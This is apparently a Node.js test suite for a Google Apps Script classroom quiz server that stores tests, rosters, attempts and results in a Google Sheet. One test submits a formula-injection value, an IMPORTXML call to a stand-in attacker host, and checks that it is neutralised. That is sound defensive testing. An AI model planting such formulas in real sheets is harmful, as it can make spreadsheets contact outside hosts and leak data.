// Runs the real Code.gs against the in-memory stand-in for Google's services.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { root } = require('./load');

function freshServer(catalog) {
  const context = vm.createContext({ console, Date, Math, JSON });
  context.globalThis = context;
  vm.runInContext(fs.readFileSync(path.join(root, 'tests/gas-mock.js'), 'utf8'), context);
  const source = fs.readFileSync(path.join(root, 'src/server/Code.gs'), 'utf8')
    .replace('/*CATALOG*/[]', JSON.stringify(catalog || [
      { id: 'U2LA1.3', title: 'Logical Operators And/Or', minutes: 20, questions: 12, attempts: 2 },
    ]));
  vm.runInContext(source, context);
  vm.runInContext('setup()', context);
  const book = vm.runInContext('__mockBook', context);
  const tests = book.getSheetByName('Tests');
  tests.getRange(2, 3).setValue(true);
  tests.getRange(2, 8).setValue('ABC12');
  const call = (name, ...args) => JSON.parse(JSON.stringify(context[name](...JSON.parse(JSON.stringify(args)))));
  return { context, book, call };
}

const REQUEST = {
  lessonId: 'U2LA1.3', klass: 'Period 1', student: 'Sample Student A', code: 'abc12',
};
const PAYLOAD = {
  percent: 75, points: 9, max: 12, concepts: 80, flow: 70, build: 75, minutes: 12.5, left: 1, awaySec: 9, reloads: 0, copies: 0, shrunk: 0, missed: 'Some concept', detail: '[]',
};

test('setup creates the tabs and can run again without losing data', () => {
  const { book, context } = freshServer();
  ['Tests', 'Roster', 'Attempts', 'Results', 'Gradebook', 'Class Summary'].forEach((name) => {
    assert.ok(book.getSheetByName(name), `${name} tab missing`);
  });
  book.getSheetByName('Roster').appendRow(['Period 4', 'New Student']);
  vm.runInContext('setup()', context);
  assert.strictEqual(book.getSheetByName('Tests').getLastRow(), 2, 'Lesson duplicated');
  assert.strictEqual(book.getSheetByName('Roster').getLastRow(), 5, 'Roster changed');
  const row = book.getSheetByName('Tests').data[1];
  assert.strictEqual(row[2], true, 'Running setup again unchecked Open');
  assert.strictEqual(row[3], true, 'Running setup again unchecked Practice');
  assert.strictEqual(row[7], 'ABC12', 'Running setup again changed the start code');
});

test('each lesson starts with Practice on or off, as the lesson says', () => {
  const lesson = { minutes: 20, questions: 12, attempts: 2 };
  const { book } = freshServer([
    { ...lesson, id: 'U2LA1.3', title: 'Taught already', practice: true },
    { ...lesson, id: 'U2LA4.1', title: 'Not yet taught', practice: false },
  ]);
  const rows = book.getSheetByName('Tests').data;
  assert.strictEqual(rows[1][3], true);
  assert.strictEqual(rows[2][3], false);
});

test('updating an existing Sheet adds the new tests and leaves its rows alone', () => {
  const { book, context } = freshServer();
  const tests = book.getSheetByName('Tests');
  tests.getRange(2, 5).setValue(35);
  const lesson = { minutes: 20, questions: 12, attempts: 2 };
  context.CATALOG = [
    { ...lesson, id: 'U2LA1.1', title: 'Earlier lesson', practice: true },
    { ...lesson, id: 'U2LA1.3', title: 'Already in the Sheet', practice: true },
    { ...lesson, id: 'U2LA4.1', title: 'Later lesson', practice: false },
  ];
  vm.runInContext('setup()', context);
  const rows = Array.from(tests.data).slice(1);
  assert.deepStrictEqual(rows.map((row) => row[0]), ['U2LA1.3', 'U2LA1.1', 'U2LA4.1']);
  assert.strictEqual(rows[0][2], true, 'Updating unchecked Open');
  assert.strictEqual(rows[0][4], 35, 'Updating changed the minutes');
  assert.strictEqual(rows[0][7], 'ABC12', 'Updating changed the start code');
  assert.strictEqual(rows[1][2], false, 'A new test started open');
  assert.strictEqual(rows[1][3], true);
  assert.strictEqual(rows[2][3], false);
});

test('config lists students and tests but never the start code', () => {
  const { call } = freshServer();
  const config = call('apiConfig');
  assert.strictEqual(config.classes.length, 2);
  assert.ok(config.lessons[0].open);
  assert.ok(!JSON.stringify(config).includes('ABC12'), 'Start code leaked to the page');
});

test('a wrong code, closed test, or unknown student cannot start', () => {
  const { call, book } = freshServer();
  assert.strictEqual(call('apiStart', { ...REQUEST, code: 'nope' }).ok, false);
  assert.strictEqual(call('apiStart', { ...REQUEST, student: 'Not Here' }).ok, false);
  book.getSheetByName('Tests').getRange(2, 3).setValue(false);
  assert.strictEqual(call('apiStart', REQUEST).ok, false);
});

test('starting twice resumes the same version instead of a new one', () => {
  const { call, book } = freshServer();
  const first = call('apiStart', REQUEST);
  assert.strictEqual(first.ok, true);
  assert.strictEqual(first.attempt.durationSec, 1200);
  const again = call('apiStart', REQUEST);
  assert.strictEqual(again.attempt.id, first.attempt.id);
  assert.strictEqual(again.attempt.seed, first.attempt.seed);
  assert.strictEqual(book.getSheetByName('Attempts').getLastRow(), 2);
});

test('different students get different versions', () => {
  const { call } = freshServer();
  const a = call('apiStart', REQUEST).attempt;
  const b = call('apiStart', { ...REQUEST, student: 'Sample Student B' }).attempt;
  assert.notStrictEqual(a.seed, b.seed);
});

test('extra time from the roster lengthens the timer', () => {
  const { call, book } = freshServer();
  book.getSheetByName('Roster').getRange(2, 3).setValue(50);
  assert.strictEqual(call('apiStart', REQUEST).attempt.durationSec, 1800);
});

test('submitting saves one result, and a repeat does not save another', () => {
  const { call, book } = freshServer();
  const { attempt } = call('apiStart', REQUEST);
  const reply = call('apiSubmit', attempt.id, PAYLOAD);
  assert.strictEqual(reply.ok, true);
  assert.strictEqual(reply.attemptsLeft, 1);
  assert.strictEqual(call('apiSubmit', attempt.id, PAYLOAD).ok, true);
  const results = book.getSheetByName('Results');
  assert.strictEqual(results.getLastRow(), 2, 'Result saved twice');
  assert.strictEqual(results.data[1][5], 75);
  assert.strictEqual(results.data[1][12], '');
});

test('one retake is allowed, then attempts run out unless the roster adds more', () => {
  const { call, book } = freshServer();
  call('apiSubmit', call('apiStart', REQUEST).attempt.id, PAYLOAD);
  const retake = call('apiStart', REQUEST);
  assert.strictEqual(retake.ok, true);
  assert.strictEqual(retake.attempt.number, 2);
  const firstSeed = book.getSheetByName('Attempts').data[1][14];
  assert.notStrictEqual(retake.attempt.seed, firstSeed, 'Retake must be a new version');
  call('apiSubmit', retake.attempt.id, PAYLOAD);
  assert.strictEqual(call('apiStart', REQUEST).ok, false);
  book.getSheetByName('Roster').getRange(2, 4).setValue(1);
  assert.strictEqual(call('apiStart', REQUEST).ok, true);
});

test('time keeps running across a reload, and late work is marked', () => {
  const { call, book } = freshServer();
  const { attempt } = call('apiStart', REQUEST);
  const attempts = book.getSheetByName('Attempts');
  attempts.data[1][6] = new Date(Date.now() + 90000);
  const resumed = call('apiResume', attempt.id);
  assert.ok(resumed.attempt.remainingSec <= 90 && resumed.attempt.remainingSec >= 85);
  attempts.data[1][6] = new Date(Date.now() - 300000);
  call('apiSubmit', attempt.id, PAYLOAD);
  assert.strictEqual(book.getSheetByName('Results').data[1][12], 'LATE');
  assert.strictEqual(call('apiResume', attempt.id).code, 'submitted');
});

test('a test abandoned past its deadline uses up that try', () => {
  const { call, book } = freshServer();
  const first = call('apiStart', REQUEST).attempt;
  book.getSheetByName('Attempts').data[1][6] = new Date(Date.now() - 1000);
  const next = call('apiStart', REQUEST);
  assert.strictEqual(next.ok, true);
  assert.notStrictEqual(next.attempt.id, first.id);
  assert.strictEqual(next.attempt.number, 2);
});

test('leaving the screen updates the live Attempts tab', () => {
  const { call, book } = freshServer();
  const { attempt } = call('apiStart', REQUEST);
  call('apiEvent', attempt.id, {
    left: 2, awayMs: 15000, reloads: 1, copies: 3, shrunk: 1,
  });
  const row = book.getSheetByName('Attempts').data[1];
  assert.deepStrictEqual(Array.from(row.slice(9, 14)), [2, 15, 1, 3, 1]);
});

test('text from the page cannot become a formula in the sheet', () => {
  const { call, book } = freshServer();
  const { attempt } = call('apiStart', REQUEST);
  call('apiSubmit', attempt.id, { ...PAYLOAD, missed: '=IMPORTXML("http://evil.example","//a")', detail: '+1+1', percent: '=1+1' });
  const row = book.getSheetByName('Results').data[1];
  assert.ok(row[18].startsWith("'="), 'Formula not neutralized');
  assert.ok(row[20].startsWith("'+"), 'Formula not neutralized');
  assert.strictEqual(row[5], 0, 'Non-number score should become 0');
});

test('a student calling teacher functions from the page is refused', () => {
  const { context, book } = freshServer();
  const before = book.getSheetByName('Tests').data[1][7];
  ['student@example.org', ''].forEach((email) => {
    vm.runInContext(`__visitor.email = ${JSON.stringify(email)}`, context);
    assert.throws(() => vm.runInContext('newStartCodes()', context), /Only the teacher/);
    assert.throws(() => vm.runInContext('setup()', context), /Only the teacher/);
  });
  assert.strictEqual(book.getSheetByName('Tests').data[1][7], before, 'Start code changed');
});

test('new start codes only change for open tests', () => {
  const { context, book } = freshServer();
  const tests = book.getSheetByName('Tests');
  vm.runInContext('newStartCodes()', context);
  assert.notStrictEqual(tests.data[1][7], 'ABC12');
  tests.getRange(2, 3).setValue(false);
  const code = tests.data[1][7];
  vm.runInContext('newStartCodes()', context);
  assert.strictEqual(tests.data[1][7], code);
});
